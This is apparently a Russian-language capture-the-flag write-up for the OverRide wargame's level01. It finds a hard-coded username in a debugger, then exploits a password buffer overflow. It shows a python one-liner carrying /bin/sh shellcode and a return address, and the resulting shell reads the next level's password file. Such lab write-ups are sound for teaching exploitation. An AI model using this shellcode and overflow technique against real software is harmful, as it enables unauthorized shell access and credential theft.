Запуская программу видим, что требуется ввести username:
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: AAAA
verifying username....

nope, incorrect username...

В main видим функцию verify_user_name, в которой строчка

0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)

производит сравнение с некоторым значением.
Установив брейкпоинт можем выяснить с чем именно сравнивается username, который ввел пользователь

(gdb) b *0x0804848b

(gdb) i r
...
esi            0x804a040        134520896
edi            0x80486a8        134514344
...
(gdb) x/s 0x804a040
0x804a040 <a_user_name>:         "AAAA\n"
(gdb) x/s 0x80486a8
0x80486a8:       "dat_wil"

Таким образом выясняем корректный username - dat_wil

Совершаем переход, если функция verify_user_name вернула 0 (<main+128>):

0x08048532 <+98>:    mov    %eax,0x5c(%esp)
0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
0x0804853b <+107>:   je     0x8048550 <main+128>

Далее fgets считает 0x64 (100) байта:
0x08048574 <+164>:   call   0x8048370 <fgets@plt>

До fgets:
(gdb) x/10xw $esp
0xffffdc50:     0xffffdc6c      0x00000064

После чего происходит вызов verify_user_pass

Поскольку в verify_user_name проверяется только 7 символов, то можно записать после dat_wil shellcode,
а в качестве пароля подать нужное смещение и адрес на начало шелкода.

python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\n' + 'A'*80 + '\x08\x04\xa0\x47'[::-1]" > /tmp/test

level01@OverRide:~$ (cat /tmp/test ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv